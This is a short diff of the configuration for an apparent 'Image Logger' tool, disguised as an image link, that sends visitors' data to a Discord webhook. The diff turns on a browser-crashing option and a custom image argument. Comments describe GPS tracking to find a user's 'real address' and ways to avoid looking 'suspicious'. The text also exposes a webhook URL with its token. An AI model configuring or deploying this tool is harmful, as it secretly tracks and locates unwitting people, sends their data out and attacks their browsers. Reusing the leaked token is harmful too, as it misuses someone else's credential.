@@ -15,14 +15,14 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1000488341336248331/ILKZ3Jviuj07VjmGPdHoC3_p8dZYRBwCO14IiONGkkKYMrWpbb_uKdj8fwUqcPAR5ic6",
     "image": "https://cdn.discordapp.com/attachments/1000488283920408677/1302106061582635079/attachment.png?ex=6726e845&is=672596c5&hm=48699516dbbef5baa8e41d7533664b841a31f9a29702c3d15293a7998df2080f&", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
